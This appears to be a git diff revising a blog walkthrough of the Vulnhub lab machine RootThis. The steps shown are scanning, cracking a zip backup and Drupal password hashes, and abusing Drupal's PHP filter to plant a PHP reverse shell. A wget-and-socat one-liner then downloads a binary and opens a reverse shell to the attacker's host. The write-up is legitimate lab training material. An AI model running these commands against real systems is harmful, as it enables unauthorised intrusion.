@@ -7,7 +7,7 @@ permalink: /:title/
 category: Vulnhub
 ---
 
-Today we're going to come back to some Vulnhub machines as there were many new added latelty. Firstly, we're going to play with machine called **RootThis** made by **Fred Wemeijer**.
+Today we're going to come back to some Vulnhub machines as there were many new added latelty. Firstly, we're going to play with machine called **RootThis**. Fairly saying it's a beginner level challenge with some general knowledge required. 
 
 * Author: [Fred Wemeijer](https://www.vulnhub.com/author/fred-wemeijer,595/)
 * Download: [https://www.vulnhub.com/entry/rootthis-1,272/](https://www.vulnhub.com/entry/rootthis-1,272/)
@@ -41,7 +41,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
 ```
 
-We can see that only `http` service is running on port `80`. I decided to run a full port scan with `-p-` option to see if there are any hidden serivices apart from this, but no luck. On the other hand, we only have one service to concetrate on.
+We can see that only `http` service is running on port `80`. I decided to run a full port scan with `-p-` option to see if there are any hidden serivices apart from this, but with no hits. On the other hand, we only have one service to concetrate on.
 
 ```html
 root@kali:~# curl 10.0.0.7
@@ -82,7 +82,7 @@ GENERATED WORDS: 4612
 + http://10.0.0.7/index.html (CODE:200|SIZE:10701)
 ```
 
-It has found two interesting places - `backup` file and `drupal` directory. And by viewing `CHANGELOG.txt` we can see that's the version that is not vulnerable to `Drupalgeddon` attacks. 
+It has found two interesting places - `backup` file and `drupal` directory. Firstly I've decided to check `drupal` and by viewing `CHANGELOG.txt` we can see that's the version that is not vulnerable to `drupalgeddon` attacks. 
 
 ```text
 Drupal 7.61, 2018-11-07
@@ -136,7 +136,7 @@ drwxr-xr-x 3 root root   4096 Feb 21 15:34 ..
 -rw-r--r-- 1 root root 270103 Dec  3 02:26 backup
 ```
 
-It's a zip archive, but unfortunately password protected.
+It's a zip archive, but unfortunately it's password protected.
 
 ```bash
 root@kali:~/vulnhub/rootme# unzip backup
@@ -145,7 +145,7 @@ Archive:  backup
    skipping: dump.sql                incorrect password
 ```
 
-As I have no clues about the password in other parts of the website, I've decided to spin up `frackzip` to crack the password with `rockyou.txt` wordlist. 
+As there are no clues about the passwords in the `drupal` I've decided to spin up `frackzip` to crack it using `rockyou.txt` wordlist. 
 
 ```bash
 root@kali:~/vulnhub/rootme# fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup 
@@ -170,7 +170,7 @@ drwxr-xr-x 3 root root    4096 Feb 21 15:34 ..
 -rw-r--r-- 1 root root 1868829 Dec  3 02:12 dump.sql
 ```
 
-SQL dump? Probably for the whole Drupal installation. Let's see, if we can find the password to the service within this file.
+SQL dump? Probably for the whole Drupal installation and may contain password for any users registred in this service. Let's take a look.
 
 ```sql
 --
@@ -191,17 +191,19 @@ Two entries. Now we can quickly paste them into Crackstation to try and crack th
 9AF2F8E8C08165DC70FA4B4F8D40EA6EC84CB6D2	MySQL4.1+	moranguita
 ```
 
-Both of them are here. After trying to log into Drupal, we can see that only `webman` account is valid, so we'll use it for now. 
+Both of them were cracked. After trying to log into Drupal, we can see that only the `webman` account is valid, so we'll use it for now. 
 
-Our plan for now would be to firstly, activate the Drupal `php_filter` module that will allow us to enter `PHP` code inside articles or pages. 
+After gaining access to Drupal, we have to find a plan to get some kind of reverse shell in the system. At the back of my mind I had a trick using `PHP filter` module, that will allow us to enter any `PHP` code inside article or pages. 
+
+Firstly, we would have to activate this module inside `modules`.
 
 ![PHP Filter](/img/rootthis/php-filter-module.png){:class="img-responsive center-block"}
 
-Now, in configuration we have to add the posibility to use this module by any user in the Drupal service. 
+After that we have to make sure that in the configuration panel, all users have the privileges to evaluate `PHP` code. 
 
 ![PHP Filter Configuration](/img/rootthis/php-filter-configuration.png){:class="img-responsive center-block"}
 
-And after all of this, let's create a new page with `PHP Reverse Shell from Pentest Monkey`. 
+And after all of this, let's create a new page with [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell).
 
 ![Reverse Shell](/img/rootthis/php-reverse-shell.png){:class="img-responsive center-block"}
 
@@ -220,7 +222,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-Onto the antoher enumartion part! First thing I've found was note in `user` home directory.
+And we're in the system. IN this part of enumaration, we have to find a way to escalate our privilages. During usual file reconnaissance, I've noticed a file in `/home/user/` directory.
 
 ```text
 $ cd /home
@@ -248,7 +250,7 @@ Regards,
 user
 ```
 
-That's a great hint, but we do not have possibility to use `su` for now, we have to upgrade our shell. Unfortunately simply doing `/bin/bash -i` did not help.
+That's a great hint, but we do not have possibility to use `su` for now. In order to get it working, we have to upgrade our shell. Unfortunately simply doing `/bin/bash -i` did not help.
 
 ```text
 $ /bin/bash -i
@@ -256,16 +258,16 @@ bash: cannot set terminal process group (497): Inappropriate ioctl for device
 bash: no job control in this shell
 ```
 
-Luckily, I've found [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) blog post, showinng method of upgrading our shell via `socat` tool. Let's follow instructions. 
+Luckily, I've found [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) blog post, showing method of upgrading our shell via `socat` tool. 
 
-On our victim:
+On our victim.
 
 ```text
 www-data@RootThis:/home/user$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444  
 <li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444
 ```
 
-And on Kali machine:
+And on Kali machine.
 
 ```text
 root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444  
